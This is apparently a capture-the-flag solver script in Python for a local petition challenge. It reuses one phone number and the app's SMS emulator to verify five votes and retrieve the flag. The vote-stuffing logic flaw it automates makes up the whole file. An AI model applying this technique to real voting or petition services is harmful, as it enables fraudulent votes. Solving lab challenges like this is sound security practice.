import requests

def create_account() -> str:
    url = "http://localhost:5443/accounts"
    headers = {"authorization": "Bearer"}
    json={"email": "test_challenge_auto@matically.com", "password": "bassvorDGFGO34AzqQf"}
    requests.post(url, headers=headers, json=json)

    url = "http://localhost:5443/sessions"
    headers = {"authorization": "Bearer"}
    json={"email": "test_challenge_auto@matically.com", "password": "bassvorDGFGO34AzqQf"}
    response = requests.post(url, headers=headers, json=json)
    return response.json()["accessToken"]

def create_petition() -> str:
    url = "http://localhost:5443/Petitions"
    headers = {"authorization": f"Bearer {access_token}"}
    json={"description": "automatic test", "name": "test petition", "targetVotes": 5}
    return requests.post(url, headers=headers, json=json).json()["id"]

def start_vote_form() -> str:
    url = "http://localhost:5443/VoteForm"
    headers = {"authorization": f"Bearer {access_token}"}
    json={"firstName": "testing", "lastName": "challenge", "petitionId": petition_id}
    response = requests.post(url, headers=headers, json=json)
    return response.json()["id"]

def set_phone_for(vote_form_id):
    url = f"http://localhost:5443/VoteForm/{vote_form_id}/phone"
    headers = {"authorization": f"Bearer {access_token}"}
    json={"phone": "(315) 585-4634"}
    requests.patch(url, headers=headers, json=json)

def request_sms_for(vote_form_id):
    url = f"http://localhost:5443/VoteForm/{vote_form_id}/requestSms"
    headers = {"authorization": f"Bearer {access_token}"}
    requests.post(url, headers=headers)

def fetch_smses() -> list[str]:
    url = "http://localhost:5443/MyPhoneEmulator"
    headers = {"authorization": f"Bearer {access_token}"}
    return requests.get(url, headers=headers).json()

def submit_vote_form(vote_form_id, sms):
    url = f"http://localhost:5443/VoteForm/{vote_form_id}/verify"
    headers = {"authorization": f"Bearer {access_token}"}
    json={"verificationCode": sms}
    requests.patch(url, headers=headers, json=json)

print("If needed, change the url in this script (localhost:5443) to the docker container url")
print("Sending request, will take a few seconds")

access_token = create_account()
petition_id = create_petition()
vote_forms_ids = []
vote_forms_ids_and_smses = []

for i in range(5):
    vf = start_vote_form()
    vote_forms_ids.append(vf)

for vfi in vote_forms_ids:
    set_phone_for(vfi)
    request_sms_for(vfi)
    sms = fetch_smses()[-1]["text"][-6:]
    vote_forms_ids_and_smses.append((vfi, sms))

for vfi, sms in vote_forms_ids_and_smses:
    submit_vote_form(vfi, sms)

print("Done, now getting the flag")

url = "http://localhost:5443/Petitions/7/flag"
headers = {"authorization": f"Bearer {access_token}"}
print(requests.get(url, headers=headers).json()["message"])
